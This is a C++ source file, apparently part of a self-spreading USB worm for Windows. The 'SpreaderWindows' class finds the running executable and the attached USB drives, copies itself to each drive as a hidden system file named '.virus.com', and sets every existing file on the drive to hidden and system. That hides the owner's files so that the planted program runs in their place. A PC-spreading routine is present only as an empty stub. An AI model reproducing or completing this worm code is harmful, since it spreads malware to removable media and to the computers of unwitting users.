#include "spreader-windows.h"
#include <cosmo.h>
#include <libc/nt/files.h>
#include <libc/nt/createfile.h>
#include <libc/nt/enum/filesharemode.h>
#include <libc/nt/enum/creationdisposition.h>
#include <filesystem>
#include <iostream>
#include <string>
#include "utils.h"
#include "constants.h"
#include "structs.h"

#include <libc/nt/enum/fileflagandattributes.h>

SpreaderWindows::SpreaderWindows() {
  char16_t buffer[MAX_PATH];

  if (GetModuleFileName(0, buffer, MAX_PATH) == 0) {
    printf("%hs\n", getErrorString());
  }

  this->current_exe = fs::path(buffer);

  int drives = GetLogicalDrives();

  for (int drive = 0; drive < MAX_DOS_DRIVES; drive++) {
    if (drives & (1 << drive)) {
      if (isUsbDevice(drive)) {
        char name[] = "A:";
        name[0] += drive;
        this->usb_drives.push_back(name);
      }
    }
  }

  std::cout << "ModuleFileName: " << this->current_exe << std::endl;
  std::cout << "USB drives: ";
  for (const auto &usb_drive : this->usb_drives) {
    std::cout << usb_drive << " ";
  }
  std::cout << std::endl;
}

void SpreaderWindows::spreadToUsb() {
  std::cout << "Spreading to Usb...\n" << std::flush;

  for (const auto &usb_drive : this->usb_drives) {
    const auto virus = usb_drive / ".virus.com";

    std::cout << virus << std::endl;

    copy(this->current_exe,
         virus,
         fs::copy_options::update_existing);

    SetFileAttributes(virus.generic_u16string().c_str(),
                      kNtFileAttributeHidden | kNtFileAttributeSystem);

    for (const auto &entry : fs::directory_iterator(usb_drive)) {
      SetFileAttributes(entry.path().generic_u16string().c_str(),
                        kNtFileAttributeHidden | kNtFileAttributeSystem);
    }
  }
}

void SpreaderWindows::spreadToPc() {
  std::cout << "Spreading to Pc...\n" << std::flush;

}

bool SpreaderWindows::shouldSpreadToUsb() const {
  for (const auto &usb_drive : this->usb_drives) {
    if (this->current_exe.c_str()[0] == usb_drive.c_str()[0]) {
      return false;
    }
  }
  return true;
}

int createFileHandle(const char16_t *deviceName) {
  int handle = CreateFile(deviceName, 0,
                          kNtFileShareRead | kNtFileShareWrite,
                          nullptr,
                          kNtOpenExisting,
                          0,
                          0);

  if (handle == -1) {
    printf("%hs\n", getErrorString());
    return false;
  }

  return handle;
}


bool isUsbDevice(const int drive) {
  char16_t deviceName[7] = u"\\\\.\\A:";
  deviceName[ARRAYLEN(deviceName) - 3] += drive;

  int handle = createFileHandle(deviceName);

  DWORD bytes;
  STORAGE_DEVICE_DESCRIPTOR devd = {};
  STORAGE_PROPERTY_QUERY query = {};
  query.PropertyId = StorageDeviceProperty;
  query.QueryType = PropertyStandardQuery;

  if (!DeviceIoControl(handle,
                       IOCTL_STORAGE_QUERY_PROPERTY,
                       &query, sizeof(query),
                       &devd, sizeof(devd),
                       &bytes, NULL)) {
    printf("%hs\n", getErrorString());
    return false;
  }

  CloseHandle(handle);
  return devd.BusType == BusTypeUsb;
}